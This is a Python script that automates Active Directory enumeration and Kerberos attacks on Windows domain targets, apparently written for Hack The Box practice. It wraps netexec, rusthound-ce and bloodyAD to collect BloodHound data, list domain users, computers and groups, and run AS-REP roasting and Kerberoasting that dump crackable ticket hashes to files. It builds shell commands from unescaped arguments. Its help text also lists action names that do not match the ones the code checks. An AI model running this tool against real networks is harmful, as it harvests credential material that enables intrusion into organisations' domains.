#!/usr/bin/python3 

import os
import subprocess
import argparse

parser = argparse.ArgumentParser(
    description="Enumeration and Exploitation for Windows Targets",
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("-i", "--ip", type=str)
parser.add_argument("-n", "--name", type=str.lower, help="Hostname")
parser.add_argument("-u", "--username", type=str)
parser.add_argument("-p", "--password", type=str)
parser.add_argument("-a", "--actions", default=[], nargs="+", help=
'''
k = generate krb5 file\t\t(nxc)
b = collect bloodhound\t\t(rust-bh)
user = list usernames\t\t(bloodyad)
computer = list computers\t(bloodyad)
group = list groups\t\t(bloodyad)
aroast = attack asreproasting\t(nxc)
kroast = attack kerberoasting\t(nxc)
''')
parser.add_argument("-v", "--VERBOSE", action="store_true", help="Show command output in terminal")
args = parser.parse_args()

def get_hosts_entry():
    with open("/etc/hosts", "r", encoding="utf-8") as f:
            lines = f.readlines()
            last_line = lines[-1].strip() if lines else ""
    l = [x for x in last_line.split() if x]
    # sometimes domain is missing?!
    # if len(l) <= 3: # Add missing Domain
    #     domain = f'{l[1].split('.')[1]}.{l[1].split('.')[2]}'
    #     lines[-1] = lines[-1].rstrip('\n') + f' {domain}\n'
    #     with open("/etc/hosts", 'w') as file:
    #         file.writelines(lines)
    #     l.append(domain)
    return l

def log_cmd(content):
    if content:
        line = content.strip()
        log_path = f'{WS_LOG}/{CMD_LOG_FILE}'
        if os.path.exists(log_path):
            with open(log_path, "r", encoding="utf-8") as f:
                lines = f.read().splitlines()
        else:
            lines = []
        if line not in lines:
            with open(log_path, "a", encoding="utf-8") as f:
                f.write(line + '\n')

class Target:
    def __init__(self):
        l = get_hosts_entry()
        self.ip = l[0]
        self.fqdn = l[1].lower()
        self.hostname = l[3].lower()
        self.domain = l[2].lower()
        self.name = l[1].split('.')[1].lower()
        self.username = args.username
        self.password = args.password

    def __str__(self):
        return (f"NAME:\t\t{self.name}\n"
                f"HOSTNAME:\t{self.hostname}\n"
                f"FQDN:\t\t{self.fqdn}\n"
                f"DOMAIN:\t\t{self.domain}\n"
                f"CREDS:\t\t{self.username} : {self.password}\n")

    def generate_krb5(self):
        print('[*] Generate krb5 file', end='\r')
        cmd = f'netexec smb {self.fqdn} --generate-krb5-file /etc/krb5.conf'
        log_cmd(cmd)
        os.system(cmd+VERBOSE[0])
        print('[+] Generate krb5 file')

    def dmp_bloodhound(self):
        os.chdir(WS_DUMP)
        if args.username and args.password:
            print('[*] Dump BloodHound data', end='\r')
            cmd = f"rusthound-ce -c All --zip -f {self.fqdn} -d {self.domain} -n IP -u {self.username} -p '{self.password}'"
            log_cmd(cmd)
            if args.VERBOSE:
                print()
                os.system(cmd + ' 2>&1 | tee dump_bloodhound.out')
            else:
                os.system(cmd+' > dump_bloodhound.out 2>&1')
            print('[+] Dump BloodHound data')
        else:
            print('[-] Dump BloodHound no creds!')  

    def lst_usernames(self):
        print('[*] List Domain Users', end='\r')
        os.chdir(WS_LST)
        cmd = f"netexec smb {self.fqdn} -u {self.username} -p '{self.password}' --users-export usernname.lst"
        log_cmd(cmd)
        os.system(cmd+VERBOSE[0])
        print('[+] List Domain Users')

    def lst_computers(self):
        print('[*] List Domain Computers', end='\r')
        os.chdir(WS_LST)
        cmd = f"bloodyAD -u {self.username} -p '{self.password}' -d {self.domain} --host {self.ip} get children --otype computer"
        filter = """ | awk -F'CN=' '{split($2,a,","); print a[1]}' | sed '/^$/d' | sed 's/$/$/' > computer.lst"""
        log_cmd(cmd+filter)
        os.system(cmd+filter)
        print('[+] List Domain Computers')

    def lst_groups(self):
        print('[*] List Domain Groups', end='\r')
        os.chdir(WS_LST)
        cmd = f"bloodyAD -u {self.username} -p '{self.password}' -d {self.domain} --host {self.ip} get children --otype group"
        filter = """ | awk -F'CN=' '{split($2,a,","); print a[1]}' | sed '/^$/d' > group.lst"""
        log_cmd(cmd+filter)
        os.system(cmd+filter)
        print('[+] List Domain Groups')

    def atk_asreproast(self):
        os.chdir(WS_ATK)
        print('[*] Attack asreproasting', end='\r')
        cmd = f"netexec ldap {self.fqdn} -u {self.username} -p {self.password} --asreproast ASREProastables.txt"
        log_cmd(cmd)
        os.system(cmd+VERBOSE[0])
        print('[+] Attack asreproasting')

    def atk_krbroast(self):
        os.chdir(WS_ATK)
        print('[*] Attack kerberoasting', end='\r')
        cmd = f"netexec ldap {self.fqdn} -u {self.username} -p {self.password} --kerberoasting kerberoastables.txt"
        log_cmd(cmd)
        os.system(cmd+VERBOSE[0])
        print('[+] Attack kerberoasting')

target = Target()
print(target)
WS = f'/home/kali/Desktop/htb/box/{target.name}'
WS_LOG = f'{WS}/log'
WS_DUMP = f'{WS}/dmp'
WS_LST = f'{WS}/lst'
WS_ATK = f'{WS}/atk'
CMD_LOG_FILE = 'commands.log'
VERBOSE = [' > /dev/null 2>&1']
if args.VERBOSE:
    VERBOSE = ['']

os.makedirs(WS, exist_ok=True)
os.makedirs(WS_LOG, exist_ok=True)
os.makedirs(WS_DUMP, exist_ok=True)
os.makedirs(WS_LST, exist_ok=True)
os.makedirs(WS_ATK, exist_ok=True)

if 'all' in args.actions:
    
    exit()
if 'krb5' in args.actions:
    target.generate_krb5()
if 'coll_bh' in args.actions:
    target.dmp_bloodhound()
if 'user' in args.actions:
    target.lst_usernames()
if 'computer' in args.actions:
    target.lst_computers()
if 'group' in args.actions:
    target.lst_groups()
if 'aroast' in args.actions:
    target.atk_asreproast()
if 'kroast' in args.actions:
    target.atk_krbroast()
